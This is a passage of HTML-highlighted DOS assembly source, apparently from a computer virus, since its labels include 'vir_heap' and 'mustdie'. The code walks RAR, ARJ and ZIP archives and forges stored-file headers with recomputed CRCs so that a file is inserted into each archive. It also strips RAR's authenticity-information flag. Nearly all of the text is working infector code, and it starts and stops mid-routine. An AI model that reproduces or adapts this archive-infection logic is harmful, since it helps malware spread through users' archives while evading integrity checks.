    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fnamesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">ha_file_hdr</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; 0h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._crthdr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doswrite</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fisize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fioff</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doswrite</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cx_0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._hafcount</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">doswrite</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;ÄÅÄÄ[process RAR]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">process_rar</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">rarhdr.rar_head_type</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0"> </span><span class="sc1">;test for multi-volume archive (?)</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rarhdr.rar_head_flags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">error_exit2</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0"> </span><span class="sc1">; remove Authenticity information present flag</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rarhdr.rar_head_flags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">rar_main_hdr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._rarhdr.rar_head_type</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calculate_CRC</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">rarhdr.rar_head_crc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosWrite_shbuf_22</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">rarhdr.rar_method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">RAR_METHOD_STORED</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">error_exit2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rarhdr.rar_f_head_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rarhdr.rar_head_flags.1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rarhdr.rar_compressed_size.lo</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rarhdr.rar_compressed_size.hi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0">
</span><span class="sc5">pr_rar</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;if eof</span><span class="sc0">
        </span><span class="sc5">EXIT</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">rarhdr.rar_head_type</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">BE</span><span class="sc0">            </span><span class="sc1">; if marker block  or archive header</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;/+- CREATE RARHDR 1.50 -+-</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._crthdr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">sto_two_byte</span><span class="sc0">    </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">sto_byte</span><span class="sc0">        </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sto_fnamesize_20</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_fisize</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;rar_host_os    =0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._arx_crc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">movs4</span><span class="sc0">                   </span><span class="sc1">;d;file crc_32</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_dtim1</span><span class="sc0">
    </span><span class="sc5">sto_two_byte</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RAR_METHOD_STORED</span><span class="sc0">
    </span><span class="sc5">sto_word_</span><span class="sc0">   </span><span class="sc4">&lt;[</span><span class="sc5">fnamesize</span><span class="sc4">]&gt;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stosw_sto_0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_fname</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._crthdr</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calculate_CRC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">crthdr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;[si-2] (?)</span><span class="sc0">
</span><span class="sc1">;\+- CREATE RARHDR -+-</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">rar_file_hdr</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">f_insert_hdr_und_file</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;include add2arj.as1</span><span class="sc0">
</span><span class="sc1">;ÄÅÄÄ[process ARJ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">   </span><span class="sc1">;seek_cur(arj_bas_hdr_size+0Ah+arj_compressed_size-22h)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">arjhdr.arj_bas_hdr_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc4">-</span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">arjhdr.arj_original_size.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0"> </span><span class="sc1">; if first header - (great BUG)</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">arjhdr.arj_compressed_size.lo</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">arjhdr.arj_compressed_size.hi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">arjhdr.arj_compres_method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ARJ_METHOD_STORED</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">error_exit3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">process_arj</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">arjhdr.arj_flags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0"> </span><span class="sc1">;test for multi-volume archive (?)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">error_exit3</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">arjhdr.arj_bas_hdr_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;/+- CREATE ARJHDR -+-</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._crthdr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">arj_h</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">   </span><span class="sc1">;arj_id</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sto_fnamesize_20</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0"> </span><span class="sc1">;31e</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0"> </span><span class="sc1">;1</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_dtim</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_fisize</span><span class="sc0">
    </span><span class="sc5">movs4</span><span class="sc0">       </span><span class="sc1">;d;file crc_32</span><span class="sc0">
    </span><span class="sc5">sto_word</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">stos2w</span><span class="sc0">           </span><span class="sc1">;0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_fname</span><span class="sc0"> </span><span class="sc1">;*;name</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">;0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._crthdr.arj_first_hdr_size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calculate_crc</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">st_dx_0</span><span class="sc0">
</span><span class="sc1">;\+- CREATE ARJHDR -+-</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_neg_ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc0">         </span><span class="sc1">;SIZE zip_local_header</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">f_insert_hdr_und_file</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">f_insert_hdr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fisize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fioff</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">f_insert</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;include add2zip.as1</span><span class="sc0">
</span><span class="sc1">;Ä[create zip headers]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">create_zip</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._crthdr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">zip_h</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0"> </span><span class="sc1">;'KP'</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0"> </span><span class="sc1">;304</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0">  </span><span class="sc5">NZ</span><span class="sc0"> </span><span class="sc1">;CENTRAL_FLAG              ;        $$if central</span><span class="sc0">
        </span><span class="sc5">sto_word</span><span class="sc0"> </span><span class="sc5">ZIP_CNL_ID</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;20d;?ver?</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0"> </span><span class="sc1">;14</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_dtim</span><span class="sc0">
    </span><span class="sc5">add_si4</span><span class="sc0">
    </span><span class="sc5">movs4</span><span class="sc0">     </span><span class="sc1">;d;file crc_32</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_fisize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fnamesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stosw_sto_0</span><span class="sc0"> </span><span class="sc1">;extra field size =0</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0"> </span><span class="sc1">;CENTRAL_FLAG        ;        $$if central</span><span class="sc0">
        </span><span class="sc5">stos3w</span><span class="sc0"> </span><span class="sc1">;=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stosw_sto_0</span><span class="sc0">
        </span><span class="sc5">add_di4</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">store_fname</span><span class="sc0">            </span><span class="sc1">;*;name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fnamesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">error_exit1</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÅÄÄ[process ZIP]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">cycle1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_size_fname</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_extra_field_length</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_compression_method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ZIP_METHOD_STORED</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">mustdie</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_compressed_size.lo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_compressed_size.hi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_buf_22</span><span class="sc0"> </span><span class="sc1">; read(ziphdr, sizeof(zipcnthdr))</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">process_zip</span><span class="sc0">
</span><span class="sc1">;$BEEP$</span><span class="sc0">
</span><span class="sc1">;    DOIF E</span><span class="sc0">

</span><span class="sc1">;    DONE</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_loc_sign.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ZIP_LCL_ID</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cycle1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ziphdr.zip_loc_sign.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ZIP_CNL_ID</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">error_exit1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_zip</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc0"> </span><span class="sc1">; SIZE zip_local_header</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek_cur_cx_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">crthdr.zip_rel_off_of_loc_hdr_.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">crthdr.zip_rel_off_of_loc_hdr_.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">zip_local_header</span><span class="sc0"> </span><span class="sc1">;1e</span><span class="sc0">
